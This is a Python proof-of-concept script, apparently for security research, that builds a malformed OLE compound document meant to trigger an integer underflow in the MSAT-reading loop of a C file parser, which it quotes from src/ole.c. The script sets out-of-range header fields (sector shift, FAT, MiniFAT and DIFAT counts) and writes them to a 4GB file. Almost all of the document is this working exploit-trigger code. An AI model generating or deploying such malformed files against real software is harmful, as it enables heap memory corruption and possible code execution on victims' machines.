""" This triggers an integer-underflow that lets you overwrite before newBuf and then resize it.
src/ole.c:136-159
	i=0;
	while((mblock >= 0) && (i < msat_size)) {
		unsigned char *newbuf;
/* 		fprintf(stderr, "i=%d mblock=%ld\n", i, mblock); */
		if ((newbuf=realloc(tmpBuf, sectorSize*(i+1)+MSAT_ORIG_SIZE)) != NULL) {
			tmpBuf=newbuf;
		} else {
			perror("MSAT realloc error");
			free(tmpBuf);
			ole_finish();
			return NULL;
		}

		fseek(newfile, 512+mblock*sectorSize, SEEK_SET);
		if(fread(tmpBuf+MSAT_ORIG_SIZE+(sectorSize-4)*i,
						 1, sectorSize, newfile) != sectorSize) {
			fprintf(stderr, "Error read MSAT!\n");
			ole_finish();
			return NULL;
		}

		i++;
		mblock=getlong(tmpBuf, MSAT_ORIG_SIZE+(sectorSize-4)*i);
	}
"""

import functools, operator, itertools, math
import ptypes, office.storage as storage, office.tools as tools
from ptypes import *

class u0(pint.uint_t): length = 0
class u8(pint.uint_t): length = 1
class u16(pint.uint_t): length = 2
class u32(pint.uint_t): length = 4
class u64(pint.uint_t): length = 8
class u128(pint.uint_t): length = 16
class s0(pint.sint_t): length = 0
class s8(pint.sint_t): length = 1
class s16(pint.sint_t): length = 2
class s32(pint.sint_t): length = 4
class s64(pint.sint_t): length = 8
class s128(pint.sint_t): length = 16

if __name__ == '__main__':
    import sys

    if len(sys.argv) != 2:
        print("Usage: {:s} outfile".format(sys.argv[0] if sys.argv else __file__))
        sys.exit(1)

    source = ptypes.setsource(ptypes.provider.empty())
    #source = ptypes.setsource(ptypes.prov.file(sys.argv[1], 'rb'))

    z = storage.File()
    z=z.a

    # these can't be messed with because they get clamped to 32-bits
    #z['sectorshift']['usectorshift'].set(math.trunc(math.log2(pow(2, 33+32))))
    #z['sectorshift']['uminisectorshift'].set(math.trunc(math.log2(pow(2, 4))))

    # we can also set this to 0. 
    z['sectorshift']['usectorshift'].set(1)
    #z['sectorshift']['uminisectorshift'].set(1)
    z['fat']['csectfat'].set(0)
    z['minifat']['csectminifat'].set(0x80000000)
    z['difat']['sectdifat'].set(3)
    z['difat']['csectdifat'].set(0x7fffffff)

    source = ptypes.prov.file(sys.argv[1], 'wb')
    source.file.truncate(0x100000000)
    z.commit(offset=0, source=source)
    source.close()
